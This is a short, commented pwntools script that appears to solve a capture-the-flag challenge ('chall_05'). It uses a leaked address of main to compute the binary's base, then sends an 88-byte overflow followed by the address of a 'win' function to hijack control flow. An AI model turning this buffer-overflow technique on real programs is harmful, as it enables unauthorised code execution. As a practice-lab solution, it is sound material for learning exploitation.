from pwn import *
p = process("./chall_05")
# Receiving data from the process until a colon character (":") is encountered and store it in the variable "leak"
p.recvuntil(":")
leak = p.recv()
# Converting the leaked address from hexadecimal to an integer
intleak = int(leak, 16)
# Loading the ELF binary into the "elf" object for analysis
elf = ELF("./chall_05")
# Calculating the base address of the ELF binary by subtracting the address of the "main" symbol from the leaked address
elf.address = intleak - elf.sym.main
# Converting the base address of the ELF binary to hexadecimal for display purposes
hex(elf.address)
# Crafting the payload: 88 bytes of 'a' characters followed by the little-endian representation of the address of the "win" symbol in the binary
payload = b'a' * 88 + p64(elf.sym.win)
p.sendline(payload)
p.interactive()

